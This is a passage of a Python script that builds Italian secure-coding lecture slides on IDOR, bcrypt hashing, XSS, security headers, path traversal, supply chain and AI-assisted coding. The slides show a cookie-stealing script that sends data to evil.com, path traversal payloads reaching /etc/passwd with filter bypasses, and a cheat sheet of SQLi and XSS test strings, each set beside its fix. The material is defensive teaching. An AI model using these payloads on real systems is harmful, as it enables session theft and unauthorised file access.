    slide_content(prs, LL, "Obiettivi",
                   [
                       "Distinguere autenticazione da autorizzazione",
                       "Riconoscere e correggere un IDOR (Broken Access Control)",
                       "Usare correttamente status code 401, 403, 404",
                       "Capire perché MD5/SHA NON vanno per password",
                       "Hashare correttamente con bcrypt (o Argon2id)",
                   ], 2, total)

    slide_two_col(prs, LL, "Authn vs Authz",
                   "AUTHENTICATION (authn)",
                   ["Chi sei?",
                    "Si verifica al LOGIN",
                    "Username + password",
                    "Token, MFA",
                    "Esempio: 'sei Mario, ok'"],
                   "AUTHORIZATION (authz)",
                   ["Cosa puoi fare?",
                    "Si verifica a OGNI richiesta",
                    "Ruoli, permessi",
                    "Ownership check",
                    "Esempio: 'Mario può vedere la fattura 42?'"],
                   3, total,
                   left_color=COL_ACCENT, right_color=COL_PRIMARY)

    slide_section(prs, LL, "01", "IDOR",
                   "Insecure Direct Object Reference — la vulnerabilità #1 web (OWASP A01)",
                   4, total)

    slide_code(prs, LL, "Codice vulnerabile IDOR",
                """@app.route("/fattura/<int:fid>")
@login_required
def fattura(fid):
    f = Fattura.query.get(fid)
    return render_template("fattura.html", fattura=f)

# Alice è loggata, vede /fattura/42 (sua)
# Cambia URL: /fattura/43 → vede la fattura di Bob
# Con uno script: /fattura/1, 2, 3, ... → ESFILTRA tutto il DB fatturazione

# @login_required c'è... ma manca l'OWNERSHIP CHECK""",
                5, total, lang_label="python", bad=True,
                note="Una sola riga di controllo mancante = data breach completo")

    slide_content(prs, LL, "Caso italiano — 100.000€ di multa",
                   [
                       "2022, e-commerce italiano",
                       "URL /ordine/<id> non protetti",
                       "Cambiando l'ID → ordini di altri clienti",
                       "  Con indirizzi, prodotti, importi, IBAN",
                       "",
                       "Sanzione Garante Privacy: ~100.000€",
                       "GDPR Art. 25 (Privacy by Design) + Art. 32 (sicurezza)",
                       "",
                       "Una sola riga avrebbe evitato tutto questo",
                   ], 6, total)

    slide_code(prs, LL, "La correzione: ownership check",
                """@app.route("/fattura/<int:fid>")
@login_required
def fattura(fid):
    f = Fattura.query.filter_by(
        id=fid,
        owner_id=session["user_id"]
    ).first_or_404()
    return render_template("fattura.html", fattura=f)

# Pattern alternativo, più pulito:
# Filtri direttamente per owner. Se la fattura non esiste
# O non è dell'utente: 404. Meno error-prone.""",
                7, total, lang_label="python", bad=False,
                note="filter_by(owner_id=...) è la chiave. Memorizzalo.")

    slide_table(prs, LL, "Status code: 401 vs 403 vs 404",
                 ["Code", "Significato", "Quando usarlo"],
                 [
                     ["401 Unauthorized", "Non autenticato", "Manca login / token scaduto"],
                     ["403 Forbidden", "Autenticato ma senza permessi", "User normale prova /admin"],
                     ["404 Not Found", "Risorsa inesistente", "URL inesistente"],
                 ], 8, total)

    slide_section(prs, LL, "02", "Password hashing",
                   "Encoding ≠ Hashing ≠ Encryption — la differenza che cambia tutto",
                   9, total)

    slide_two_col(prs, LL, "Tre operazioni DIVERSE",
                   "Encoding — NO per password",
                   ["Base64, URL encoding",
                    "Reversibile e banale",
                    "Serve solo per il TRASPORTO dati",
                    "Non è crittografia",
                    "",
                    "Encryption — NO per password",
                    "AES, RSA",
                    "Reversibile con CHIAVE",
                    "Se rubano la chiave: disastro"],
                   "Hashing — SÌ per password",
                   ["bcrypt, Argon2id, scrypt",
                    "NON reversibile",
                    "Da hash NON torni alla password",
                    "Salt automatico",
                    "",
                    "Work factor configurabile",
                    "  bcrypt cost=12 ≈ 250ms",
                    "Per l'utente: impercettibile",
                    "Per l'attaccante: devastante"],
                   10, total)

    slide_content(prs, LL, "Perché MD5 e SHA-256 NON vanno per password",
                   [
                       "Velocità: SHA-256 su GPU = miliardi/sec",
                       "  Rubato il DB, brute force in poche ore",
                       "",
                       "Rainbow tables: senza salt, password identiche → hash identici",
                       "  Tabelle pre-calcolate di password comuni",
                       "",
                       "MD5 e SHA-1: collisioni note. Morti definitivamente.",
                       "",
                       "bcrypt e Argon2id sono progettati apposta per essere LENTI",
                   ], 11, total)

    slide_code(prs, LL, "Hashing corretto: bcrypt",
                """import bcrypt

# Hash di una nuova password
def hash_password(password: str) -> bytes:
    return bcrypt.hashpw(password.encode("utf-8"),
                          bcrypt.gensalt(rounds=12))

# Verifica al login
def verify_password(password: str, hash_db: bytes) -> bool:
    return bcrypt.checkpw(password.encode("utf-8"), hash_db)

# Tre linguaggi, una libreria standard:
# Python: bcrypt
# Java: BCryptPasswordEncoder (Spring Security)
# PHP:   password_hash($pwd, PASSWORD_BCRYPT, ['cost' => 12])""",
                12, total, lang_label="python", bad=False,
                note="Una riga di codice. Niente scuse per non usarlo.")

    slide_table(prs, LL, "Diagnosi visiva: apri il DB e guarda",
                 ["Cosa vedi nella colonna password", "Diagnosi"],
                 [
                     ["mariopwd (testo leggibile)", "🔥 CHIARO — catastrofico"],
                     ["5f4dcc3b5aa765d61... (32 hex)", "🔥 MD5 — morto"],
                     ["5baa61e4c9b93f3f068... (40 hex)", "🔥 SHA-1 — morto"],
                     ["e3b0c44298fc1c149... (64 hex)", "⚠ SHA-256 — inadeguato"],
                     ["$2b$12$KIXbN... (inizia con $2b$)", "✅ bcrypt — OK"],
                     ["$argon2id$v=19$m=65536...", "✅ Argon2id — ottimo"],
                 ], 13, total)

    slide_qa(prs, LL, 14, total,
             next_lesson="L5 — XSS + header HTTP di sicurezza")

    prs.save("L4_idor_password.pptx")
    print("OK L4")


def make_lesson_5():
    """L5 — XSS + Header HTTP."""
    prs = new_pres()
    total = 14
    LL = "L5"

    slide_cover(prs, "5",
                 "XSS e header HTTP di sicurezza",
                 "JavaScript dell'attaccante nel browser della vittima",
                 "Lezione 5 · 2 ore")

    slide_content(prs, LL, "Obiettivi",
                   [
                       "Cos'è Cross-Site Scripting (XSS) e i suoi 3 tipi",
                       "Eseguire XSS Reflected e XSS Stored",
                       "Difendersi con escape automatico (Jinja2 e amici)",
                       "Conoscere i 6 header HTTP di sicurezza fondamentali",
                       "Configurare cookie sicuri (Secure, HttpOnly, SameSite)",
                   ], 2, total)

    slide_quote(prs, LL,
                 "XSS = il JavaScript dell'attaccante eseguito nel browser della tua vittima.",
                 None, 3, total)

    slide_content(prs, LL, "Come funziona un browser",
                   [
                       "1. Scarica HTML della pagina",
                       "2. Applica CSS",
                       "3. Trova tag <script> e li ESEGUE",
                       "4. Permette al JS di accedere a DOM, cookie, fare richieste",
                       "",
                       "Se l'attaccante riesce a far eseguire del SUO JS",
                       "dentro la TUA pagina → ha accesso a tutto",
                       "(cookie sessione, dati form, azioni a nome utente)",
                   ], 4, total)

    slide_content(prs, LL, "I 3 tipi di XSS",
                   [
                       "REFLECTED — il payload è nell'URL, riflesso nella pagina",
                       "  Esempio: /cerca?q=<script>alert(1)</script>",
                       "  Vittima: chi clicca il link malevolo",
                       "",
                       "STORED — il payload è salvato nel DB (commenti, post)",
                       "  Vittima: chiunque visita la pagina (più grave)",
                       "",
                       "DOM-BASED — JS della pagina prende valore da location.hash",
                       "  Più raro, più subdolo",
                   ], 5, total)

    slide_code(prs, LL, "Esempio: Stored XSS letale",
                """# Commento postato dall'attaccante:
<script>
  fetch('https://evil.com/?c=' + document.cookie)
</script>

# Cosa succede quando un altro utente visita la pagina:
# 1. Il browser scarica il commento
# 2. Trova il tag <script>, lo esegue
# 3. Lo script invia il cookie di sessione della VITTIMA all'attaccante
# 4. L'attaccante usa quel cookie → account takeover

# Senza chiedere mai la password.""",
                6, total, lang_label="javascript", bad=True,
                note="Per questo HttpOnly sui cookie di sessione è critico")

    slide_code(prs, LL, "La correzione: escape automatico (Jinja2)",
                """<!-- Template Jinja2 in Flask -->
<h1>Risultati per: {{ query }}</h1>

# Se query contiene: <script>alert(1)</script>
# Jinja2 la trasforma automaticamente in:
# &lt;script&gt;alert(1)&lt;/script&gt;
#
# Il browser la mostra come TESTO LETTERALE
# NON la esegue come tag → XSS neutralizzata

# Equivalenti:
# Java + Thymeleaf:  <span th:text="${query}"></span>
# PHP + Twig:        {{ query }}
# React:             {query}""",
                7, total, lang_label="jinja", bad=False,
                note="Default escape è SEMPRE attivo. Non disabilitarlo con |safe.")

    slide_content(prs, LL, "Il pericolo del |safe",
                   [
                       "In Jinja2: {{ comment | safe }}",
                       "Disabilita l'escape → XSS GARANTITA su input utente",
                       "",
                       "Equivalenti in altri framework:",
                       "  Vue: v-html",
                       "  React: dangerouslySetInnerHTML",
                       "  Blade: {!! $x !!}",
                       "",
                       "Usali solo su testo statico che hai scritto TU.",
                       "Mai, MAI, MAI su input utente.",
                   ], 8, total)

    slide_content(prs, LL, "Se l'utente DEVE poter scrivere HTML ricco",
                   [
                       "Caso: piattaforma blog, commenti con grassetto/corsivo/link",
                       "Soluzione: bleach (Python) — sanitization",
                       "",
                       "from bleach import clean",
                       "safe = clean(input, tags=['p','b','i','a'],",
                       "             attributes={'a':['href']},",
                       "             protocols=['http','https'])",
                       "",
                       "Mantiene <b><i><p><a>, rimuove <script>, attributi javascript:",
                   ], 9, total)

    slide_section(prs, LL, "02", "Header HTTP di sicurezza",
                   "Configurazione rapida, difese potenti", 10, total)

    slide_table(prs, LL, "I 6 header di sicurezza fondamentali",
                 ["Header", "Cosa fa"],
                 [
                     ["Strict-Transport-Security", "Forza HTTPS dopo prima visita (HSTS)"],
                     ["Content-Security-Policy", "Limita risorse caricabili (anti-XSS L2)"],
                     ["X-Frame-Options: DENY", "Blocca clickjacking via iframe"],
                     ["X-Content-Type-Options: nosniff", "Blocca MIME sniffing del browser"],
                     ["Referrer-Policy", "Controlla cosa va nel Referer"],
                     ["Permissions-Policy", "Limita API browser (camera, mic, geoloc)"],
                 ], 11, total)

    slide_code(prs, LL, "Cookie sicuri",
                """# Configurazione Flask
app.config.update(
    SESSION_COOKIE_SECURE=True,      # Solo HTTPS
    SESSION_COOKIE_HTTPONLY=True,     # JS NON può leggerlo (anti-XSS)
    SESSION_COOKIE_SAMESITE="Lax",    # Anti-CSRF
    PERMANENT_SESSION_LIFETIME=3600,
)

# Risultato nel browser:
# Set-Cookie: session=abc123;
#             Secure;
#             HttpOnly;
#             SameSite=Lax;
#             Path=/;
#             Max-Age=3600""",
                12, total, lang_label="python", bad=False,
                note="3 attributi + 1 configurazione = -90% rischio di session hijacking")

    slide_content(prs, LL, "Test rapido del tuo sito",
                   [
                       "Vai su: securityheaders.com",
                       "Inserisci il tuo dominio",
                       "Ti dà un voto da F ad A+",
                       "",
                       "Confronto:",
                       "  github.com → A",
                       "  Molti siti italiani PA → F",
                       "",
                       "Aggiungere tutti gli header in Flask: 10 minuti con Flask-Talisman",
                   ], 13, total)

    slide_qa(prs, LL, 14, total,
             next_lesson="L6 — Input validation + Supply chain")

    prs.save("L5_xss_header.pptx")
    print("OK L5")


def make_lesson_6():
    """L6 — Input validation + Supply chain."""
    prs = new_pres()
    total = 14
    LL = "L6"

    slide_cover(prs, "6",
                 "Input validation e supply chain",
                 "Pydantic, path traversal, e il rischio delle dipendenze",
                 "Lezione 6 · 2 ore")

    slide_content(prs, LL, "Obiettivi",
                   [
                       "Distinguere validation, sanitization e encoding",
                       "Capire perché whitelist > blacklist",
                       "Usare Pydantic per validation strutturata in Python",
                       "Riconoscere e correggere il path traversal",
                       "Scoprire CVE nelle dipendenze con pip-audit",
                       "Comprendere SBOM e Cyber Resilience Act (2027)",
                   ], 2, total)

    slide_two_col(prs, LL, "Tre operazioni DIVERSE",
                   "Cosa fanno (in 3 parole)",
                   ["VALIDATION:",
                    "  verifica + rifiuta",
                    "",
                    "SANITIZATION:",
                    "  modifica + tiene",
                    "",
                    "ENCODING:",
                    "  trasforma all'uscita"],
                   "Quando si applicano",
                   ["VALIDATE: all'entrata",
                    "  (rifiuta input invalidi)",
                    "",
                    "ENCODE: all'uscita",
                    "  (proteggi dal contesto)",
                    "",
                    "SANITIZE: solo se serve",
                    "  struttura ricca (HTML)"],
                   3, total,
                   left_color=COL_ACCENT, right_color=COL_PRIMARY)

    slide_two_col(prs, LL, "Whitelist vs Blacklist",
                   "BLACKLIST (anti-pattern)",
                   ["s.replace(\"'\", \"\")",
                    "Blocco questi caratteri",
                    "Problema: lista incompleta",
                    "Bypass con encoding, varianti, Unicode",
                    "L'attaccante è creativo",
                    "Strategia perdente"],
                   "WHITELIST (corretto)",
                   ["regex r\"^[a-zA-Z0-9_]{3,20}$\"",
                    "Accetto solo questi",
                    "Definito, esplicito",
                    "Se serve aggiungere caratteri:",
                    "  li aggiungi consapevolmente",
                    "Strategia robusta"],
                   4, total)

    slide_section(prs, LL, "01", "Pydantic", "Validation strutturata in Python", 5, total)

    slide_code(prs, LL, "Pydantic — esempio completo",
                """from pydantic import BaseModel, EmailStr, Field, field_validator
from datetime import date

class UserCreate(BaseModel):
    username: str = Field(min_length=3, max_length=20,
                           pattern=r"^[a-zA-Z0-9_]+$")
    email: EmailStr
    age: int = Field(ge=18, le=120)
    password: str = Field(min_length=12)
    birthdate: date

    @field_validator("birthdate")
    @classmethod
    def adult(cls, v):
        if (date.today() - v).days < 18*365:
            raise ValueError("devi essere maggiorenne")
        return v""",
                6, total, lang_label="python", bad=False,
                note="Type-safe, dichiarativo, errori chiari, integrazione con FastAPI")

    slide_content(prs, LL, "Cosa fa Pydantic per te",
                   [
                       "Controlla i TIPI (se non corretti, errore)",
                       "Controlla i VINCOLI (lunghezza, range, regex)",
                       "Esegue VALIDATOR custom (regole business)",
                       "Restituisce errori dettagliati con path JSON",
                       "Genera automaticamente JSON Schema (per OpenAPI/FastAPI)",
                       "",
                       "Equivalenti: Bean Validation (Java), Zod (TS), Symfony Validator (PHP)",
                   ], 7, total)

    slide_section(prs, LL, "02", "Path Traversal",
                   "Quando un parametro filename diventa una porta aperta",
                   8, total)

    slide_code(prs, LL, "Codice vulnerabile a path traversal",
                """@app.route("/download")
def download():
    filename = request.args.get("file")
    return send_file(f"./uploads/{filename}")

# Attacco: GET /download?file=../etc/passwd
# Path costruito: ./uploads/../etc/passwd
# Il sistema operativo lo risolve a: /etc/passwd
# → L'attaccante legge file di sistema

# Varianti:
#   ../../etc/passwd       (più livelli)
#   ....//....//etc/passwd (bypass filtro ../)
#   ..%2f..%2fetc%2fpasswd (URL encoded)""",
                9, total, lang_label="python", bad=True,
                note="Vale anche per /var/myapp/secrets, /home/user/.ssh/id_rsa, ...")

    slide_code(prs, LL, "La correzione: 3 controlli obbligatori",
                """import os
from flask import abort, send_from_directory

UPLOAD_DIR = os.path.realpath("./uploads")
ALLOWED_EXTS = {".pdf", ".png", ".jpg"}

@app.route("/download")
@login_required
def download():
    filename = request.args.get("file", "")
    # 1) Whitelist: solo nome file, NO separatori
    if "/" in filename or "\\\\" in filename or filename.startswith("."):
        abort(400)
    # 2) Whitelist estensione
    if os.path.splitext(filename)[1].lower() not in ALLOWED_EXTS:
        abort(400)
    # 3) realpath + startswith
    full = os.path.realpath(os.path.join(UPLOAD_DIR, filename))
    if not full.startswith(UPLOAD_DIR + os.sep):
        abort(403)
    return send_from_directory(UPLOAD_DIR, filename, as_attachment=True)""",
                10, total, lang_label="python", bad=False,
                note="Quattro righe di controllo, tre attacchi neutralizzati")

    slide_section(prs, LL, "03", "Supply chain",
                   "Il tuo codice è il 5% del tuo software. Il resto sono dipendenze.",
                   11, total)

    slide_content(prs, LL, "Caso reale: Log4Shell (dicembre 2021)",
                   [
                       "CVE-2021-44228 — Log4j (libreria di logging Java)",
                       "CVSS: 10.0 (massimo)",
                       "Stringa nel User-Agent → RCE sul server",
                       "",
                       "Impatto: ~10% di tutti i server enterprise al mondo",
                       "Mezza Internet ha patchato in emergenza per 2 settimane",
                       "",
                       "Chi aveva un SBOM: identificato in 5 minuti dove era vulnerabile",
                       "Chi non l'aveva: cercato per settimane",
                   ], 12, total)

    slide_code(prs, LL, "pip-audit — scoprire CVE nelle dipendenze",
                """$ pip install pip-audit
$ pip-audit

Found 2 known vulnerabilities in 1 package
Name   Version  ID                  Fix Versions
flask  2.0.0    GHSA-m2qf-hxjv-5gpq  2.2.5
flask  2.0.0    GHSA-4j93-pq9p-vpc2  2.3.2

# Aggiorna:
$ pip install --upgrade flask
$ pip-audit
No known vulnerabilities found ✓

# Equivalenti per altri linguaggi:
#   npm audit (Node.js)
#   OWASP Dependency-Check (Java/Maven)
#   Snyk (commerciale, multi-linguaggio)""",
                13, total, lang_label="bash", bad=False,
                note="Da fare in CI: blocca il deploy se ci sono CVE Critical/High")

    slide_qa(prs, LL, 14, total,
             next_lesson="L7 — Documentazione sicurezza + uso responsabile AI")

    prs.save("L6_validation_supply.pptx")
    print("OK L6")


def make_lesson_7():
    """L7 — Documentazione + AI."""
    prs = new_pres()
    total = 14
    LL = "L7"

    slide_cover(prs, "7",
                 "Documentazione e uso dell'IA",
                 "SECURITY.md, AI assistente sicuro, validazione del codice generato",
                 "Lezione 7 · 2 ore")

    slide_content(prs, LL, "Obiettivi",
                   [
                       "Capire perché documentare la sicurezza è un requisito (non burocrazia)",
                       "Strutturare un documento SECURITY.md per un progetto",
                       "Conoscere i 7 errori tipici del codice generato da IA",
                       "Applicare il workflow di validazione in 4 step",
                       "Sapere quando NON usare l'IA",
                   ], 2, total)

    slide_section(prs, LL, "01", "Documentazione di sicurezza",
                   "GDPR Art. 32 chiede 'misure tecniche adeguate'. Le devi sapere elencare.",
                   3, total)

    slide_content(prs, LL, "Documentare la sicurezza: 3 motivi",
                   [
                       "1. REQUISITO LEGALE",
                       "   GDPR Art. 32 · NIS 2 Art. 21 · CRA (2027)",
                       "",
                       "2. REQUISITO OPERATIVO",
                       "   Nuovi sviluppatori sanno cosa è stato fatto",
                       "   Auditor verificano in mezza giornata",
                       "",
                       "3. REQUISITO POST-INCIDENT",
                       "   Sapere dove sono le contromisure attive",
                   ], 4, total)

    slide_content(prs, LL, "Template SECURITY.md — 9 sezioni",
                   [
                       "1. Informazioni generali (progetto, owner, dati trattati, norme)",
                       "2. Threat model (DFD + tabella STRIDE)",
                       "3. Controlli applicati (auth, authz, validation, header, cifratura)",
                       "4. Vulnerabilità note e debt tecnico (trasparenza)",
                       "5. Test di sicurezza (automatici + pentest)",
                       "6. Incident response (contatti emergenza, playbook)",
                       "7. Compliance (GDPR, NIS 2, CRA)",
                       "8. Approvazione e revisione",
                       "9. Allegati (DPIA, pentest report, SBOM)",
                   ], 5, total, bullet_size=16)

    slide_table(prs, LL, "Esempio sezione 3.1 — Autenticazione",
                 ["Controllo", "Stato", "Dettaglio"],
                 [
                     ["Hashing password", "✅ Implementato", "bcrypt cost=12"],
                     ["MFA", "⚠ Parziale", "TOTP solo per admin"],
                     ["Rate limit login", "✅ Implementato", "5/min via flask-limiter"],
                     ["Risposta uniforme errori", "✅ Implementato", "stesso msg email/password"],
                     ["Session ID rigenerato", "✅ Implementato", "Flask-Login default"],
                 ], 6, total)

    slide_content(prs, LL, "Collegamento con UF 7",
                   [
                       "UF 7 — Tecniche di redazione documentazione tecnica",
                       "ti dà le basi: chiarezza, struttura, stile",
                       "",
                       "Applica quei principi a SECURITY.md",
                       "",
                       "Esercizio raccomandato: per il TUO progetto di stage,",
                       "mantieni un SECURITY.md compilato fin dall'inizio.",
                       "Sarà uno degli output più apprezzati in azienda.",
                   ], 7, total)

    slide_section(prs, LL, "02", "Uso responsabile dell'IA",
                   "Copilot, Claude, ChatGPT, Cursor: moltiplicatori di produttività... e di errori",
                   8, total)

    slide_quote(prs, LL,
                 "L'IA non sa di sicurezza. Tu devi.",
                 None, 9, total)

    slide_content(prs, LL, "Il problema",
                   [
                       "Studi GitHub (2022), Stanford (2023):",
                       "",
                       "~40% dei suggerimenti Copilot in scenari di sicurezza",
                       "contengono vulnerabilità",
                       "",
                       "Gli sviluppatori con AI scrivono codice meno sicuro,",
                       "ma sono PIÙ CONVINTI che sia sicuro (bias cognitivo)",
                       "",
                       "Tradotto: l'IA è uno strumento potente, non un revisore di sicurezza",
                   ], 10, total)

    slide_content(prs, LL, "I 7 errori tipici del codice IA",
                   [
                       "1. SQL Injection con f-string",
                       "2. Hash deboli (SHA-256) per password",
                       "3. Manca authorization check",
                       "4. Template senza escape",
                       "5. CORS troppo permissivo ('origins': '*')",
                       "6. Eccezioni catch-all che falliscono in modo aperto",
                       "7. Segreti hardcoded ('change-me')",
                       "",
                       "BONUS: librerie inventate (hallucination)",
                   ], 11, total)

    slide_content(prs, LL, "Workflow di validazione in 4 step",
                   [
                       "1. LEGGI E CAPISCI (30 sec)",
                       "   Se non sapresti spiegarlo a un collega: non accettare",
                       "",
                       "2. SCANSIONA PATTERN (1 min)",
                       "   f-string in SQL? hash deboli? eval/exec? cookie senza attributi?",
                       "",
                       "3. VERIFICA CONTESTO (1-2 min)",
                       "   Coerente con architettura, versioni, convenzioni?",
                       "",
                       "4. TEST + LINTER (5-15 min)",
                       "   pytest + bandit + semgrep",
                   ], 12, total)

    slide_content(prs, LL, "Quando NON usare l'IA",
                   [
                       "Crittografia 'fatta in casa' (usa librerie standard)",
                       "Codice di sicurezza critico (authn/authz)",
                       "Compliance e legale (privacy policy, cookie banner)",
                       "Quando NON sai validare (impara prima!)",
                       "",
                       "Caso reale: Samsung 2023",
                       "Dipendenti incollarono codice proprietario in ChatGPT",
                       "→ OpenAI lo usò per training",
                       "→ leakato indirettamente",
                       "→ Samsung dovette vietare ChatGPT",
                   ], 13, total)

    slide_qa(prs, LL, 14, total,
             next_lesson="L8 — Lab integrato finale")

    prs.save("L7_documentazione_ai.pptx")
    print("OK L7")


def make_lesson_8():
    """L8 — Lab integrato finale."""
    prs = new_pres()
    total = 12
    LL = "L8"

    slide_cover(prs, "8",
                 "Lab integrato finale",
                 "Sei un junior security analyst. Trova le vulnerabilità.",
                 "Lezione 8 · 2 ore — VERIFICA")

    slide_content(prs, LL, "Cosa farai oggi",
                   [
                       "Hai imparato 7 capitoli di secure coding",
                       "Oggi applichi tutto su un'app vera, in 80 minuti",
                       "",
                       "SCENARIO:",
                       "Sei un junior security analyst.",
                       "Ti viene affidata una piccola app per una review prima del rilascio.",
                       "Output: mini-report scritto.",
                   ], 2, total)

    slide_two_col(prs, LL, "Regole del lab",
                   "✅ PERMESSO",
                   ["Leggere il codice sorgente",
                    "DevTools, curl, sqlite3, DB Browser",
                    "Lavorare a coppie",
                    "1 hint gratis dal docente",
                    "Consultare le dispense"],
                   "🚫 NON PERMESSO",
                   ["Aprire la versione corretta",
                    "Cercare la soluzione su Google",
                    "Copiare il report",
                    "2° hint costa -5% sul voto"],
                   3, total,
                   left_color=COL_OK, right_color=COL_DANGER)

    slide_content(prs, LL, "Cheat-sheet di campo (1)",
                   [
                       "SQL Injection?",
                       "  Form login, ricerca, parametri in WHERE",
                       "  Test: '   ' OR '1'='1'   admin' --",
                       "",
                       "IDOR?",
                       "  URL con ID numerici (/fattura/42)",
                       "  Cambia l'ID, vedi se accedi",
                       "",
                       "XSS?",
                       "  Campi rivisualizzati (commenti, profilo)",
                       "  Test: <script>alert(1)</script>",
                   ], 4, total)

    slide_content(prs, LL, "Cheat-sheet di campo (2)",
                   [
                       "Crypto Failures?",
                       "  Apri il DB con DB Browser",
                       "  Password in chiaro? MD5? bcrypt?",
                       "",
                       "Path Traversal?",
                       "  Endpoint con parametro filename",
                       "  Test: ?file=../etc/passwd",
                       "",
                       "BONUS — Cookie / Header / CVE in dipendenze",
                       "  DevTools → Application → Cookies",
                       "  pip-audit -r requirements.txt",
                   ], 5, total)

    slide_content(prs, LL, "Mini-report richiesto",
                   [
                       "Almeno 3 vulnerabilità identificate",
                       "Per ognuna:",
                       "  Descrizione (cos'è, dove si trova)",
                       "  Proof of Concept funzionante",
                       "  Fix proposto in codice",
                       "  Severity (Low / Medium / High / Critical)",
                       "  Categoria OWASP",
                       "  Norma violata (se applicabile)",
                       "",
                       "Lunghezza: 1-2 pagine. Formato libero.",
                   ], 6, total)

    slide_table(prs, LL, "Griglia di valutazione (su 100)",
                 ["Voce", "Peso"],
                 [
                     ["Numero vulnerabilità (≥3 = sufficiente, 5+ = ottimo)", "25"],
                     ["Correttezza tecnica dei PoC", "30"],
                     ["Qualità dei fix proposti", "30"],
                     ["Severity giustificata coerentemente", "10"],
                     ["Mapping OWASP / norma violata", "5"],
                     ["Sufficienza: 60/100", ""],
                 ], 7, total)

    slide_content(prs, LL, "Cosa distingue un report eccellente",
                   [
                       "Ha trovato almeno una vulnerabilità 'bonus'",
                       "  (cookie senza HttpOnly, CVE in deps, header mancanti)",
                       "",
                       "PoC riproducibili passo-passo",
                       "Fix non solo 'patch puntuale' ma raccomandazioni architetturali",
                       "Cita correttamente GDPR/NIS 2 dove applicabile",
                       "Executive summary chiaro in 3 frasi",
                   ], 8, total)

    slide_section(prs, LL, "Final", "Cosa porti via dal corso",
                   "5 idee, che ti restano tra 5 anni", 9, total)

    slide_content(prs, LL, "Cosa porti a casa",
                   [
                       "1. La sicurezza si PROGETTA, non si aggiunge",
                       "2. DEFENSE IN DEPTH sempre. Mai una sola difesa.",
                       "3. MENTALITÀ AVVERSARIA. Cosa fa che non dovrebbe?",
                       "4. I fondamentali tecnici OWASP — li riconosci a vista, li correggi a memoria",
                       "5. DOCUMENTA, TESTA, AUTOMATIZZA",
                   ], 10, total)

    slide_content(prs, LL, "Per crescere ancora (gratuito)",
                   [
                       "PortSwigger Web Security Academy",
                       "  Il miglior corso gratuito al mondo, lab guidati",
                       "",
                       "TryHackMe — beginner friendly",
                       "HackTheBox starting point — più hard, cresci tanto",
                       "OWASP — cheat sheets, top 10, ASVS",
                       "",
                       "Certificazioni entry: CompTIA Security+, eJPT, PortSwigger BSCP",
                   ], 11, total)

    slide_qa(prs, LL, 12, total)

    prs.save("L8_lab_finale.pptx")
    print("OK L8")


# ============================================================================
# MAIN
# ============================================================================

if __name__ == "__main__":
    import os
    os.chdir(os.path.dirname(os.path.abspath(__file__)))

    make_lesson_1()
    make_lesson_2()
    make_lesson_3()
    make_lesson_4()
    make_lesson_5()
    make_lesson_6()
    make_lesson_7()
    make_lesson_8()
    print("\n✅ Tutte le 8 slide generate")
